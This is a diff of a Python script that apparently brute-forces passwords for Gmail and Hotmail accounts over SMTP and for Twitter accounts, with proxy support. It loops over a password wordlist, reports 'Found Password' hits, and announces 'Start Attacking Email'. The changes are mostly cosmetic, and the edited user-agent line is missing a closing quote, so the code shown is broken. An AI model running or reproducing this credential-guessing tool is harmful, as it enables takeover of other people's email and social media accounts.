@@ -1,5 +1,4 @@
 #!/usr/bin/python
-
 import smtplib
 import threading
 from optparse import *
@@ -50,7 +49,7 @@ use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 brows = Browser()
 brows.set_handle_robots(False)
 brows._factory.is_html = True
-brows.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]
+brows.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)]
 
 def proxy():
     logging.basicConfig()
@@ -72,7 +71,7 @@ def twitter():
     password_list = io.open(options.list_password,"r").readlines()
     try_login = 0
     print("\rTwitter Account: {}".format(options.twitter))
-    print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,W))
+    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
     for password in password_list:
         password = password.rstrip('\n')
         try_login += 1
@@ -113,17 +112,17 @@ if options.gmail == None  :
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
         if options.password != None or options.list_password == None  :
-            print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
+            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
             try :
                 smtp_srverH.login(options.hotmail,options.password)
-                print("FOUND Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
+                print("Found Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
             except :
                 print("Not Found Password : {} \t Email Hotmail:{}".format(options.password,options.hotmail))
         elif options.list_password !=None or options.password == None :
             password_list = io.open(options.list_password,"r").readlines()
             for password in password_list:    
                 try :
-                    print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
+                    print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
                     smtp_srverH.login(options.hotmail,password)
                     print("FOUND Password :{} \n Found Hotmail:{}".format(password,options.hotmail))
                 except smtplib.SMTPAuthenticationError:
@@ -136,20 +135,20 @@ elif options.gmail !=None or  options.hotmail== None or options.twitter==None:
     smtp_srverG.ehlo()
     smtp_srverG.starttls()
     if options.password != None or options.list_password == None  :
-        print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
+        print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
         try :    
             smtp_srverG.login(options.gmail,options.password)
-            print("FOUND Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
+            print("Found Password :{} \t Found Gmail:{}".format(options.password,options.gmail))
         except :
             print("Not Found Password : {} \t Email Gmail:{}".format(options.password,options.gmail))
     elif options.list_password !=None:
         password_list = io.open(options.list_password,"r").readlines()
         for password in password_list:
             password = password.rstrip("\n")
-            print("%s<<<<<<++++++start  attacking email+++++>>>>>%s"%(R,G))
+            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
             try :    
                 smtp_srverG.login(options.gmail,password)
-                print("{}<<<+++FOUND Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
+                print("{}<<<+++Found Password :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
                 break
             except smtplib.SMTPAuthenticationError:
                 print("{}<<<---Not Found Password : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))                       
